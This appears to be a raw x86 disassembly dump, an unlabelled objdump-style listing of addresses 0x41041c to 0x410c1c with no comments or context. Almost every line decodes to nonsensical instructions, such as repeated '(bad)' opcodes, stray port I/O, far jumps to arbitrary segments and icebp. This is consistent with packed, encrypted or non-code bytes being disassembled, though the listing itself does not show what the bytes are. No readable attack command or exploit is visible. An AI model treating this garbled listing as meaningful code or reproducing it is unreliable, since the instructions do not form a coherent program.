  41041c:	adc    al,0xfc
  41041e:	mov    ebx,0xdcd54661
  410423:	add    bl,BYTE PTR [esi+0x7f1a3b9a]
  410429:	inc    edx
  41042a:	jmp    0x410433
  41042c:	add    dl,bh
  41042e:	outs   dx,BYTE PTR ds:[esi]
  41042f:	mov    ecx,0x7d721dfb
  410434:	lods   al,BYTE PTR ds:[esi]
  410435:	(bad)  
  410436:	fcomp  DWORD PTR [eax+edi*1+0x71]
  41043a:	inc    ebp
  41043b:	xchg   edx,eax
  41043c:	sbb    eax,0x84ab7d03
  410441:	adc    ah,BYTE PTR [edi]
  410443:	mov    dh,0xe4
  410445:	mul    BYTE PTR [eax+0x53]
  410448:	sub    DWORD PTR [edi-0x3d],0x803062ad
  41044f:	mov    dh,0xe2
  410451:	outs   dx,BYTE PTR ds:[esi]
  410452:	push   0x5f
  410454:	int    0x4f
  410456:	rcl    DWORD PTR [ecx+0x13],0x42
  41045a:	clc    
  41045b:	nop
  41045c:	lea    esi,[ebx+0x68d52c74]
  410462:	shr    DWORD PTR [ebx],0xd3
  410465:	mov    ds:0xae89f3e6,eax
  41046a:	mov    ds:0xabb0767d,al
  41046f:	fxtract 
  410471:	imul   ebx,edx,0xffffffac
  410474:	cmc    
  410475:	in     al,dx
  410476:	mov    ecx,0x171e132c
  41047b:	inc    esi
  41047c:	(bad)  
  41047d:	mov    ebx,0x27dae6e2
  410482:	fisttp QWORD PTR [edi-0x68]
  410485:	cmp    ah,dl
  410487:	ffreep st(0)
  410489:	test   BYTE PTR [eax],bh
  41048b:	and    edi,esi
  41048d:	push   esi
  41048e:	and    DWORD PTR [edx+0x5e6ce536],0x6660da1
  410498:	push   ebp
  410499:	mov    ch,0x92
  41049b:	rcl    BYTE PTR [ebp+0x5b],cl
  41049e:	cmc    
  41049f:	in     eax,dx
  4104a0:	jg     0x410423
  4104a2:	test   al,0xf8
  4104a4:	xchg   edi,eax
  4104a5:	fdivr  st,st(6)
  4104a7:	mov    bh,0xf2
  4104a9:	cmp    eax,0xbec50958
  4104ae:	fild   WORD PTR [ebx-0x3]
  4104b1:	sub    DWORD PTR [edx],eax
  4104b3:	fsub   st,st(6)
  4104b5:	push   ebp
  4104b6:	lods   eax,DWORD PTR ds:[esi]
  4104b7:	daa    
  4104b8:	mov    ecx,0x40b67917
  4104bd:	lods   eax,DWORD PTR ds:[esi]
  4104be:	cmp    BYTE PTR [ebx],dh
  4104c0:	(bad)  
  4104c1:	jno    0x410482
  4104c3:	jne    0x4104e3
  4104c5:	mov    ebx,0xfd95d45
  4104ca:	in     eax,0xa3
  4104cc:	ret    0x79d5
  4104cf:	mov    eax,DWORD PTR es:[ebp-0xf3152d6]
  4104d6:	ret    
  4104d7:	cmp    ah,BYTE PTR [ebx+esi*2+0x40820b80]
  4104de:	pusha  
  4104df:	call   FWORD PTR [ebx-0x60f89cec]
  4104e5:	pushf  
  4104e6:	stc    
  4104e7:	in     eax,dx
  4104e8:	dec    esi
  4104e9:	dec    DWORD PTR [edx+eiz*8+0x431c3cfa]
  4104f0:	jmp    0x8c9c:0xc92ec55a
  4104f7:	sbb    eax,0x821c9d9e
  4104fc:	and    eax,0xd94d04f3
  410501:	jmp    0xaaa9:0xf9dcc7f0
  410508:	fisttp QWORD PTR [eax+0x13632988]
  41050e:	pop    esi
  41050f:	clc    
  410510:	mov    al,0x5
  410512:	cmp    ch,bl
  410514:	pop    ss
  410515:	push   ecx
  410516:	xchg   esi,eax
  410517:	js     0x410566
  410519:	mov    edx,esp
  41051b:	out    0xd2,eax
  41051d:	push   0x16ec8998
  410522:	pop    ecx
  410523:	mov    cl,0xb4
  410525:	cdq    
  410526:	cli    
  410527:	mov    al,ds:0xe0c6a3b9
  41052c:	cmp    eax,edx
  41052e:	jae    0x4104d1
  410530:	inc    esp
  410531:	lds    edi,FWORD PTR ds:0xbd9ddc4f
  410537:	call   0x2237:0x21218a5c
  41053e:	aam    0x8b
  410540:	ins    BYTE PTR es:[edi],dx
  410541:	sub    ch,BYTE PTR [esi]
  410543:	repz sbb esp,DWORD PTR [ecx]
  410546:	pop    ds
  410547:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410548:	or     al,0x5b
  41054a:	jmp    0xf01fe857
  41054f:	xor    ah,dh
  410551:	inc    ecx
  410552:	mov    bl,bl
  410554:	dec    ecx
  410555:	add    DWORD PTR [edi-0x5cbd38be],0xf
  41055c:	enter  0x4d8d,0xb3
  410560:	stos   BYTE PTR es:[edi],al
  410561:	jnp    0x41059c
  410563:	leave  
  410564:	and    eax,0x97cb3e47
  410569:	imul   edx,edi
  41056c:	mov    edi,DWORD PTR [ebp-0x8]
  41056f:	mov    ebx,DWORD PTR [ebp-0x10]
  410572:	jmp    0x4107fa
  410577:	cmp    al,0xd6
  410579:	ret    0xdac3
  41057c:	fcmovnb st,st(1)
  41057e:	aad    0xe1
  410580:	pop    es
  410581:	adc    ah,BYTE PTR [ecx]
  410583:	mov    esp,DWORD PTR [ebx]
  410585:	pop    edx
  410586:	sbb    eax,0x78785339
  41058b:	in     eax,0x7e
  41058d:	js     0x410607
  41058f:	inc    edx
  410590:	ss mov dh,0x81
  410593:	(bad)  
  410594:	mov    WORD PTR ds:[edi],ds
  410597:	inc    ebp
  410598:	mov    dl,0x93
  41059a:	xchg   ah,al
  41059c:	enter  0xd752,0x76
  4105a0:	or     ebx,eax
  4105a2:	push   es
  4105a3:	jge    0x41059e
  4105a5:	sbb    al,0x25
  4105a7:	xor    BYTE PTR [ebx+eax*8-0x4e469846],ch
  4105ae:	jmp    0x31e1:0x1e29fd
  4105b5:	cld    
  4105b6:	shr    ah,1
  4105b8:	mov    esp,0x6955cebf
  4105bd:	test   BYTE PTR [edx],0x42
  4105c0:	lea    edx,[ebp+0x5b1f2518]
  4105c6:	pop    es
  4105c7:	lea    edi,[ebx-0x2]
  4105ca:	lods   al,BYTE PTR ds:[esi]
  4105cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105cc:	ret    
  4105cd:	xlat   BYTE PTR ds:[ebx]
  4105ce:	adc    al,0xaf
  4105d0:	outs   dx,BYTE PTR ds:[esi]
  4105d1:	sbb    esi,DWORD PTR [ecx+0xc]
  4105d4:	dec    ecx
  4105d5:	sbb    al,0xb6
  4105d7:	in     eax,dx
  4105d8:	test   al,0x12
  4105da:	mov    BYTE PTR [ebp-0x63],ah
  4105dd:	retf   0xce83
  4105e0:	mov    ecx,0xd6168656
  4105e5:	mov    bh,0x57
  4105e7:	mov    dl,0x4f
  4105e9:	inc    esp
  4105ea:	pop    eax
  4105eb:	inc    edx
  4105ec:	mov    dl,0x8b
  4105ee:	xor    DWORD PTR [ecx-0x60f8e98a],esi
  4105f4:	idiv   ebp
  4105f6:	ret    
  4105f7:	sub    eax,DWORD PTR [eax+0x18]
  4105fa:	jb     0x410602
  4105fc:	pop    ss
  4105fd:	loope  0x4105bf
  4105ff:	or     ch,ah
  410601:	or     DWORD PTR [edi-0x79],eax
  410604:	test   DWORD PTR [ebp-0x45a36b23],0x89a715c
  41060e:	cmp    al,0xf8
  410610:	mov    cl,0xed
  410612:	mov    ecx,0x51ef20ac
  410617:	sub    BYTE PTR [edi+0x161dd8e7],0x36
  41061e:	lahf   
  41061f:	jne    0x4105cf
  410621:	pop    esi
  410622:	arpl   WORD PTR [edi+edi*1+0x6b],si
  410626:	adc    edi,DWORD PTR [esi]
  410628:	dec    eax
  410629:	loopne 0x410633
  41062b:	loope  0x41062b
  41062d:	cmp    DWORD PTR [esi+0x169a1692],0x58
  410634:	jb     0x41066d
  410636:	out    0x1d,al
  410638:	xlat   BYTE PTR ds:[ebx]
  410639:	xchg   esi,eax
  41063a:	and    al,0x1d
  41063c:	les    eax,FWORD PTR [ebx-0x1]
  41063f:	in     eax,dx
  410640:	test   BYTE PTR [edx-0x3f],dl
  410643:	and    DWORD PTR [esi+0x21],ebp
  410646:	sub    edx,esp
  410648:	addr16 mov esi,0xa1c72f16
  41064e:	xchg   BYTE PTR [ebx+0x3c919cc9],bh
  410654:	pop    esi
  410655:	xor    DWORD PTR [edx],0x2059e77
  41065b:	push   ebx
  41065c:	hlt    
  41065d:	mov    dl,0x49
  41065f:	adc    al,cl
  410661:	cmp    dh,BYTE PTR [ecx+0x2bbeee2c]
  410667:	xchg   esp,eax
  410668:	mov    BYTE PTR [esi*4+0x121c8cea],ah
  41066f:	jle    0x410644
  410671:	mov    ds:0xd427d2a8,al
  410676:	loopne 0x4106ad
  410678:	mov    esp,0x13faff24
  41067d:	retf   0xf086
  410680:	sahf   
  410681:	mov    esp,ds
  410683:	mov    es,WORD PTR [esi]
  410685:	xchg   DWORD PTR ds:0xa8c1a491,edi
  41068b:	sti    
  41068c:	pop    ebp
  41068d:	(bad)  
  41068e:	fist   WORD PTR [edi+0x79]
  410691:	mov    bl,0xd1
  410693:	add    al,0x13
  410695:	sti    
  410696:	mov    bh,0xf2
  410698:	mov    DWORD PTR [ecx-0x57eddd0d],edx
  41069e:	scas   eax,DWORD PTR es:[edi]
  41069f:	ror    DWORD PTR [edi+ecx*4],0x4f
  4106a3:	mov    WORD PTR [ebp-0x67],fs
  4106a6:	or     eax,0x8d792d7a
  4106ab:	fcom   QWORD PTR [esi+0xdcafba1]
  4106b1:	icebp  
  4106b2:	push   eax
  4106b3:	sbb    BYTE PTR [edx],ch
  4106b5:	fisubr DWORD PTR [esp+edx*8-0x7e]
  4106b9:	(bad)  
  4106ba:	jmp    0x4106df
  4106bc:	inc    edx
  4106bd:	adc    DWORD PTR [ebx+0x66],esi
  4106c0:	push   ecx
  4106c1:	jns    0x4106e0
  4106c3:	mov    bl,bh
  4106c5:	or     eax,0x65efd8dd
  4106ca:	sbb    esp,DWORD PTR [ecx-0x2e6f3767]
  4106d0:	cwde   
  4106d1:	xchg   edx,eax
  4106d2:	add    al,0x3f
  4106d4:	pushf  
  4106d5:	dec    eax
  4106d6:	out    dx,al
  4106d7:	cdq    
  4106d8:	dec    eax
  4106d9:	push   ecx
  4106da:	cmp    BYTE PTR [esi+0x7e690d78],0xd9
  4106e1:	addr16 mov ch,0x3e
  4106e4:	cmc    
  4106e5:	out    0xe1,al
  4106e7:	popa   
  4106e8:	inc    dx
  4106ea:	retf   
  4106eb:	mov    bh,0x2c
  4106ed:	popf   
  4106ee:	sub    al,0xe7
  4106f0:	outs   dx,BYTE PTR ds:[esi]
  4106f1:	stc    
  4106f2:	push   edx
  4106f3:	sbb    BYTE PTR [esi+0x391444ee],0x75
  4106fa:	fst    DWORD PTR [esi-0x41]
  4106fd:	mov    ebx,0x86b879d5
  410702:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410703:	mov    eax,0xe1811d09
  410708:	in     al,0xf3
  41070a:	sub    BYTE PTR [ebp-0x3592ef9b],0xb5
  410711:	lahf   
  410712:	and    ecx,ebp
  410714:	adc    ch,bh
  410716:	cmc    
  410717:	int    0x9a
  410719:	inc    esi
  41071a:	or     eax,0xb616b8e6
  41071f:	fsub   QWORD PTR [edx]
  410721:	mov    bh,0x83
  410723:	test   DWORD PTR [edi+ecx*2-0xc5a368c],ebx
  41072a:	push   edx
  41072b:	aaa    
  41072c:	jmp    0x41073b
  41072e:	or     DWORD PTR [ebx-0x4f],ebx
  410731:	mov    cl,0x8c
  410733:	pop    esi
  410734:	(bad)  
  410735:	pop    ecx
  410736:	imul   edi,DWORD PTR [edx+0x6],0xcdc59eda
  41073d:	sub    ch,BYTE PTR [edi+0x7c]
  410740:	inc    edx
  410741:	icebp  
  410742:	xchg   esi,eax
  410743:	aam    0xec
  410745:	ret    0xca8d
  410748:	jbe    0x410763
  41074a:	fimul  DWORD PTR [ecx]
  41074c:	push   ds
  41074d:	jg     0x41077c
  41074f:	adc    eax,0x7fc511f
  410754:	in     eax,0x1d
  410756:	ror    BYTE PTR [ebp+0x24],0xd8
  41075a:	fcomp  QWORD PTR [ecx+0x2]
  41075d:	pushf  
  41075e:	test   al,0x7a
  410760:	xchg   edx,esp
  410762:	mov    bh,BYTE PTR [edx+0x15]
  410765:	push   0x9314b360
  41076a:	pushf  
  41076b:	xor    DWORD PTR [ebx+0x74],eax
  41076e:	xchg   esi,eax
  41076f:	cld    
  410770:	mov    esp,0xd5b8e5e5
  410775:	ins    BYTE PTR es:[edi],dx
  410776:	add    ebp,DWORD PTR [ecx+0x7f]
  410779:	dec    ebp
  41077a:	dec    ebx
  41077b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41077c:	mul    edi
  41077e:	fsub   QWORD PTR ds:0x3d85
  410783:	in     eax,0x8d
  410785:	test   eax,0xed3659d2
  41078a:	cmp    ebx,DWORD PTR [esp+eax*8]
  41078d:	push   ss
  41078e:	xchg   esp,eax
  41078f:	and    al,0xe9
  410791:	imul   esp,DWORD PTR [edi-0x13b9da79],0x24a9a5ae
  41079b:	add    esi,esi
  41079d:	cwde   
  41079e:	stos   DWORD PTR es:[edi],eax
  41079f:	dec    ecx
  4107a0:	push   ds
  4107a1:	aad    0x5f
  4107a3:	inc    ecx
  4107a4:	xor    al,0x23
  4107a6:	and    dl,BYTE PTR [edx]
  4107a8:	sbb    eax,0x79417fb5
  4107ad:	jp     0x410738
  4107af:	xchg   ah,bh
  4107b1:	aaa    
  4107b2:	push   ss
  4107b3:	loop   0x410809
  4107b5:	cmp    bh,bh
  4107b7:	ja     0x41080a
  4107b9:	iret   
  4107ba:	push   edi
  4107bb:	test   eax,0x4cdfca03
  4107c0:	mov    bh,BYTE PTR [ebp-0x45]
  4107c3:	mov    ds:0x28767186,eax
  4107c8:	xchg   ecx,eax
  4107c9:	xlat   BYTE PTR ds:[ebx]
  4107ca:	jecxz  0x41083c
  4107cc:	ret    0x6bc9
  4107cf:	(bad)  
  4107d1:	inc    ecx
  4107d2:	fiadd  WORD PTR [ebx]
  4107d4:	fs aam 0xa7
  4107d7:	sbb    BYTE PTR [esi+ebx*2],dh
  4107da:	push   0xfffffff6
  4107dc:	js     0x41080b
  4107de:	pusha  
  4107df:	cmp    DWORD PTR [eax],eax
  4107e1:	xchg   ebp,eax
  4107e2:	mov    dh,0x1c
  4107e4:	sub    al,0x10
  4107e6:	ins    BYTE PTR es:[edi],dx
  4107e7:	in     eax,dx
  4107e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4107e9:	popa   
  4107ea:	dec    eax
  4107eb:	addr16 dec esi
  4107ed:	sbb    al,0x53
  4107ef:	sahf   
  4107f0:	push   0xffffffe4
  4107f2:	mov    ds:0x13b1e3cf,eax
  4107f7:	test   DWORD PTR [edx],0x3bdf2b7a
  4107fd:	fucompp 
  4107ff:	add    DWORD PTR [edx],0x0
  410802:	add    dh,cl
  410804:	ror    ebx,0xc8
  410807:	fcmovnbe st,st(6)
  410809:	fld    st(1)
  41080b:	ud0    edi,esp
  41080e:	pop    ds
  41080f:	adc    eax,0xa6b5847e
  410814:	push   ecx
  410815:	js     0x41088f
  410817:	in     eax,0x7e
  410819:	js     0x410893
  41081b:	or     DWORD PTR ds:0xedf1ec1e,edi
  410821:	imul   ebp,DWORD PTR [ecx+0x731d2714],0x28
  410828:	push   eax
  410829:	inc    ebx
  41082a:	outs   dx,DWORD PTR ds:[esi]
  41082b:	dec    edx
  41082c:	pop    edi
  41082d:	lds    edx,FWORD PTR [eax]
  41082f:	sub    DWORD PTR [edi-0x2ad9dff6],ebp
  410835:	pusha  
  410836:	or     dh,BYTE PTR [edi+esi*8+0x57]
  41083a:	lds    ebp,FWORD PTR [edi+0x51]
  41083d:	pop    eax
  41083e:	xchg   esi,eax
  41083f:	mov    edx,0x5e813146
  410844:	lods   al,BYTE PTR ds:[esi]
  410845:	pop    edi
  410846:	and    bh,BYTE PTR es:[ebp+ecx*8+0x26]
  41084b:	lods   eax,DWORD PTR ds:[esi]
  41084c:	(bad)  
  41084d:	lock push edx
  41084f:	test   DWORD PTR [ebx+eiz*4],eax
  410852:	dec    ebx
  410853:	inc    ecx
  410854:	cmp    al,0x5e
  410856:	hlt    
  410857:	mov    BYTE PTR [edx-0x6c14fdf6],dl
  41085d:	add    BYTE PTR [esi],bl
  41085f:	fstp   st(1)
  410861:	lods   al,BYTE PTR ds:[esi]
  410862:	adc    eax,0xbbc5bb8d
  410867:	aaa    
  410868:	dec    ecx
  410869:	push   cs
  41086a:	mov    esp,0xb9821e84
  41086f:	mov    al,ds:0xe4d716df
  410874:	or     al,0x48
  410876:	adc    DWORD PTR [ebx],esp
  410878:	aaa    
  410879:	fptan  
  41087b:	xchg   ecx,eax
  41087c:	xlat   BYTE PTR ds:[ebx]
  41087d:	pop    ds
  41087e:	sbb    eax,0xf88c55d9
  410883:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410884:	jb     0x410886
  410886:	mov    ds:0x11a713de,eax
  41088b:	push   ebp
  41088c:	add    al,0xb
  41088e:	repnz mov bl,0x25
  410891:	imul   eax,DWORD PTR [ecx],0x950d3992
  410897:	mov    bh,0xa4
  410899:	mov    ds:0xf293cd7c,al
  41089e:	inc    eax
  41089f:	push   esi
  4108a0:	and    ch,BYTE PTR [edi]
  4108a2:	(bad)  
  4108a3:	sbb    DWORD PTR [ecx],ebx
  4108a5:	(bad)  
  4108a6:	xchg   ebp,eax
  4108a7:	jbe    0x4108bc
  4108a9:	and    al,0x6d
  4108ab:	fs jo  0x410917
  4108ae:	push   ebp
  4108af:	sbb    BYTE PTR [ebp-0x10],dl
  4108b2:	jg     0x410861
  4108b4:	adc    esi,DWORD PTR [edx-0x46d0cd31]
  4108ba:	mov    edi,0xc3a29fe7
  4108bf:	cmp    eax,0x2ee4a494
  4108c4:	cmc    
  4108c5:	nop
  4108c6:	cmp    DWORD PTR [esi-0x409230b1],eax
  4108cc:	push   edx
  4108cd:	clc    
  4108ce:	and    DWORD PTR [edx+0x2eee7be1],ebx
  4108d4:	jmp    0x9cf4:0xac7fde31
  4108db:	mov    ebp,0xb26c18e3
  4108e0:	mov    bl,BYTE PTR [esi-0x1f1d2f08]
  4108e6:	xchg   ebx,eax
  4108e7:	popa   
  4108e8:	pop    edx
  4108e9:	stc    
  4108ea:	dec    ebx
  4108eb:	icebp  
  4108ec:	xor    al,0x15
  4108ee:	data16 and al,0xbd
  4108f1:	cmp    DWORD PTR [eax+0x7c0684f3],eax
  4108f7:	add    DWORD PTR [ebx],edx
  4108f9:	xchg   ebx,eax
  4108fa:	jmp    0x23357121
  4108ff:	jmp    0x410891
  410901:	mov    DWORD PTR [ebx-0x91157f2],edi
  410907:	(bad)  
  410908:	rol    DWORD PTR cs:[ebx+0x6c],cl
  41090c:	in     eax,0x59
  41090e:	lods   eax,DWORD PTR ds:[esi]
  41090f:	xchg   esp,eax
  410910:	cwde   
  410911:	mov    bl,cl
  410913:	xor    ch,BYTE PTR [esi+0x3d26de71]
  410919:	mov    edx,0xd974d50b
  41091e:	leave  
  41091f:	xchg   esi,eax
  410920:	das    
  410921:	xor    DWORD PTR [esi-0x68],edi
  410924:	aam    0x51
  410926:	push   ecx
  410927:	add    dh,al
  410929:	(bad)  
  41092a:	fcmovnb st,st(3)
  41092c:	enter  0xbb3e,0x24
  410930:	xchg   edi,eax
  410931:	shl    eax,1
  410933:	sbb    BYTE PTR [ebx+0x47],cl
  410936:	jae    0x4109a8
  410938:	loope  0x41091b
  41093a:	and    al,0xe7
  41093c:	loopne 0x410937
  41093e:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  410940:	push   ecx
  410941:	lds    ecx,FWORD PTR [ecx+0x42bc601e]
  410947:	adc    BYTE PTR [esp+eax*8-0x27815869],dh
  41094e:	inc    DWORD PTR [edx+edi*8-0x1d189a56]
  410955:	mov    eax,0xef5e2010
  41095a:	ja     0x41094d
  41095c:	leave  
  41095d:	cmp    BYTE PTR [eax-0x9],0x7d
  410961:	dec    ecx
  410962:	dec    esi
  410963:	mov    edi,0xa43dc453
  410968:	imul   DWORD PTR [ebx+0x454609b0]
  41096e:	sbb    ebp,eax
  410970:	adc    al,0x3b
  410972:	je     0x41097d
  410974:	stc    
  410975:	mov    edi,0x9801c012
  41097a:	xor    esp,DWORD PTR [ecx-0x54]
  41097d:	dec    ecx
  41097e:	ret    
  41097f:	jno    0x410901
  410981:	inc    eax
  410982:	mov    bl,BYTE PTR [edx]
  410984:	and    bh,dh
  410986:	pop    ebp
  410987:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410988:	dec    esp
  410989:	sub    eax,0x838b7d2a
  41098e:	xchg   esi,eax
  41098f:	inc    ebx
  410990:	mov    al,ds:0xa1cf9e97
  410995:	sbb    al,0x18
  410997:	ja     0x4109d5
  410999:	ret    
  41099a:	jmp    0x15c7:0xe3bdc1a1
  4109a1:	mov    esp,0x69fb5783
  4109a6:	inc    ecx
  4109a7:	sar    DWORD PTR [eax-0x22712d4c],0x3e
  4109ae:	or     edi,ebp
  4109b0:	push   0xf88d7c6f
  4109b5:	(bad)  
  4109b6:	cli    
  4109b7:	out    dx,al
  4109b8:	scas   al,BYTE PTR es:[edi]
  4109b9:	xchg   esi,eax
  4109ba:	scas   al,BYTE PTR es:[edi]
  4109bb:	mov    cl,0x77
  4109bd:	int    0xc1
  4109bf:	cmp    ebp,edi
  4109c1:	and    ebx,ebx
  4109c3:	cli    
  4109c4:	test   BYTE PTR [ebp-0x1c4d1f06],dh
  4109ca:	ins    BYTE PTR es:[edi],dx
  4109cb:	ficom  WORD PTR [ebp-0x6a]
  4109ce:	cmp    esp,esp
  4109d0:	das    
  4109d1:	lahf   
  4109d2:	scas   al,BYTE PTR es:[edi]
  4109d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4109d4:	adc    dl,al
  4109d6:	in     al,dx
  4109d7:	in     eax,dx
  4109d8:	ja     0x410974
  4109da:	push   0x29c79c59
  4109df:	mov    ds:0xfea0319c,eax
  4109e4:	sbb    ebx,eax
  4109e6:	shl    DWORD PTR [edx+eax*1],cl
  4109e9:	shl    ah,cl
  4109eb:	jbe    0x410a16
  4109ed:	mov    esi,0x5ca7e566
  4109f2:	fnstsw WORD PTR [edx+0x4dc62240]
  4109f8:	pop    edx
  4109f9:	repz loopne 0x41098f
  4109fc:	pop    ecx
  4109fd:	jae    0x4109f7
  4109ff:	or     al,0x56
  410a01:	dec    esi
  410a02:	div    BYTE PTR [ebp+0x45]
  410a05:	xchg   BYTE PTR gs:[ebx+0x1daf14a8],bl
  410a0c:	arpl   WORD PTR [ebx+0x39],sp
  410a0f:	out    0xc9,al
  410a11:	dec    edx
  410a12:	jle    0x4109d1
  410a14:	or     al,BYTE PTR gs:[edx-0x2a]
  410a18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a19:	call   0x665d5228
  410a1e:	rcr    DWORD PTR [ebx-0x64],1
  410a21:	mov    edx,0x2e124af1
  410a26:	and    DWORD PTR [esi+0x7291edf4],esp
  410a2c:	mov    ch,0x26
  410a2e:	mov    ds:0x6549ffaf,eax
  410a33:	es dec eax
  410a35:	xor    BYTE PTR [ebp+esi*4-0x55ea2858],dh
  410a3c:	(bad)  
  410a3d:	adc    ebx,ebx
  410a3f:	mov    esp,0x10066c31
  410a44:	dec    edx
  410a45:	and    ecx,DWORD PTR [ebx-0x215b0735]
  410a4b:	sbb    DWORD PTR [edi],eax
  410a4d:	popf   
  410a4e:	icebp  
  410a4f:	xor    ah,dl
  410a51:	call   0x8f77ed0
  410a56:	mov    esp,0xc00db141
  410a5b:	pusha  
  410a5c:	loopne 0x410acb
  410a5e:	lea    ebp,[esi+ebp*4-0x5f]
  410a62:	imul   ebp,DWORD PTR [edx+0x6a532699],0xb1963469
  410a6c:	fdivr  QWORD PTR [edx+0x77c38c98]
  410a72:	jne    0x410a76
  410a74:	pop    ecx
  410a75:	call   0x4958:0x6e481441
  410a7c:	repz xchg edi,eax
  410a7e:	sbb    DWORD PTR [esi-0x15],0xffffff98
  410a82:	in     eax,dx
  410a83:	mov    ds:0x870f0a73,al
  410a88:	or     BYTE PTR [eax],al
  410a8a:	add    BYTE PTR [eax],al
  410a8c:	mov    edx,DWORD PTR [ebp-0x28]
  410a8f:	jmp    0x411f76
  410a94:	mov    edx,DWORD PTR [ebp-0x30]
  410a97:	mov    edi,DWORD PTR [ebp-0x4]
  410a9a:	xor    edx,eax
  410a9c:	xor    edi,eax
  410a9e:	jmp    0x410d26
  410aa3:	aas    
  410aa4:	retf   
  410aa5:	iret   
  410aa6:	(bad)
  410aa9:	aad    0xc9
  410aab:	jo     0x410a57
  410aad:	lods   eax,DWORD PTR ds:[esi]
  410aae:	not    DWORD PTR [edi]
  410ab0:	sub    eax,0x56133cda
  410ab5:	js     0x410b2f
  410ab7:	in     eax,0x7e
  410ab9:	js     0x410b33
  410abb:	and    dh,BYTE PTR [edi+0xb]
  410abe:	mov    ds:0x21978ac0,eax
  410ac3:	or     cl,BYTE PTR [edx+0x6ee8286e]
  410ac9:	sbb    al,BYTE PTR [edi-0x35]
  410acc:	test   eax,0xe06ab467
  410ad1:	xor    al,0xb2
  410ad3:	cli    
  410ad4:	mov    si,0x2ec6
  410ad8:	lahf   
  410ad9:	adc    al,0xc1
  410adb:	into   
  410adc:	sar    DWORD PTR [ebp+ebp*2+0x61],1
  410ae0:	int    0x3
  410ae2:	mov    esi,?
  410ae4:	mov    ds:0x8c9a5b33,al
  410ae9:	ror    dl,cl
  410aeb:	sub    eax,DWORD PTR [edi+0x3f3e5824]
  410af1:	fwait
  410af2:	fwait
  410af3:	mov    eax,ds:0x1f0bfa11
  410af8:	sbb    al,0xb0
  410afa:	cld    
  410afb:	inc    BYTE PTR ds:0xbb25992a
  410b01:	test   eax,0x6dc26c70
  410b06:	fldenv [ebx+ecx*4]
  410b09:	aas    
  410b0a:	imul   esp,DWORD PTR [edx+0x566ffc3a],0x9565f56f
  410b14:	fcomp  QWORD PTR [esi-0x35]
  410b17:	cdq    
  410b18:	sbb    eax,0xe17e4615
  410b1d:	adc    eax,0xf7150f6b
  410b22:	jmp    0x410b7f
  410b24:	jb     0x410b34
  410b26:	aad    0xd2
  410b28:	pop    edx
  410b29:	stos   DWORD PTR es:[edi],eax
  410b2a:	push   es
  410b2b:	outs   dx,DWORD PTR ds:[esi]
  410b2c:	push   esp
  410b2d:	mov    bh,0x53
  410b2f:	mov    dh,0x58
  410b31:	stos   BYTE PTR es:[edi],al
  410b32:	in     eax,dx
  410b33:	loopne 0x410adf
  410b35:	dec    eax
  410b36:	mov    edi,0xae325ba7
  410b3b:	pop    eax
  410b3d:	inc    edi
  410b3e:	adc    dl,0xf6
  410b41:	sub    edx,esp
  410b43:	mov    DWORD PTR [eax+0x71],0x6144ee5a
  410b4a:	inc    edx
  410b4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b4c:	fisubr DWORD PTR [ecx]
  410b4e:	pop    edx
  410b4f:	or     eax,0xea0e4266
  410b54:	dec    edx
  410b55:	adc    esp,ecx
  410b57:	mov    esi,0x69584d34
  410b5c:	pop    ds
  410b5d:	xor    DWORD PTR [edi-0x1d],0xffffff8a
  410b61:	les    esi,FWORD PTR [ecx+0x5d]
  410b64:	or     al,BYTE PTR [eax+0x71]
  410b67:	mov    ds:0xc9c43274,al
  410b6c:	out    0x11,eax
  410b6e:	seto   BYTE PTR [eax-0x5e]
  410b72:	aam    0xd7
  410b74:	repnz inc esp
  410b76:	sbb    eax,0xbc2c96c3
  410b7b:	ss sbb eax,0x946ba345
  410b82:	cmc    
  410b83:	stos   DWORD PTR es:[edi],eax
  410b84:	or     BYTE PTR [ebp+0x3afb9735],bh
  410b8a:	mov    edx,0x54262994
  410b8f:	and    DWORD PTR [eax+0x72d0d6ff],ebp
  410b95:	mov    ds:0x71a69ac8,al
  410b9a:	adc    eax,0x691bd8d
  410b9f:	mov    bl,ch
  410ba1:	xor    DWORD PTR [esi],0xffffff9a
  410ba4:	cmp    esp,ebp
  410ba6:	pop    esi
  410ba7:	inc    ebp
  410ba8:	sub    dl,dl
  410baa:	pop    eax
  410bab:	jb     0x410b8d
  410bad:	push   ss
  410bae:	icebp  
  410baf:	retf   
  410bb0:	inc    ecx
  410bb1:	mov    eax,0xb11fc1ab
  410bb6:	add    BYTE PTR [edi-0x1b7adc8f],al
  410bbc:	sub    esp,0xffffff9f
  410bbf:	mov    cl,0x2c
  410bc1:	test   eax,0x78e91a87
  410bc6:	inc    ebx
  410bc7:	xor    eax,0xef50153f
  410bcc:	xchg   edx,eax
  410bcd:	sub    BYTE PTR [ebx-0x4cfa4643],0x45
  410bd4:	dec    ecx
  410bd5:	dec    eax
  410bd6:	xchg   ebx,eax
  410bd7:	inc    esp
  410bd8:	add    dh,0xf7
  410bdb:	add    eax,eax
  410bdd:	rol    bl,cl
  410bdf:	pop    eax
  410be0:	ins    BYTE PTR es:[edi],dx
  410be1:	adc    ch,BYTE PTR [eax+0x39]
  410be4:	add    dl,BYTE PTR [ebx]
  410be6:	inc    ebp
  410be7:	sub    bl,BYTE PTR [edx-0x397f2fdd]
  410bed:	test   al,0x4e
  410bef:	(bad)  
  410bf0:	adc    eax,0xf04ee8e9
  410bf5:	les    esi,FWORD PTR [edi+ebp*2+0x58]
  410bf9:	add    eax,0x319bd862
  410bfe:	int    0xc8
  410c00:	jbe    0x410b93
  410c02:	dec    esi
  410c03:	mov    cl,0x65
  410c05:	test   al,0x1b
  410c07:	jecxz  0x410c6b
  410c09:	in     eax,0x78
  410c0b:	cmp    al,bh
  410c0d:	mov    WORD PTR [ebp+0x45273106],fs
  410c13:	scas   eax,DWORD PTR es:[edi]
  410c14:	jne    0x410c37
  410c16:	lods   al,BYTE PTR ds:[esi]
  410c17:	cmp    eax,0x86d90edc
  410c1c:	jb     0x410bbe
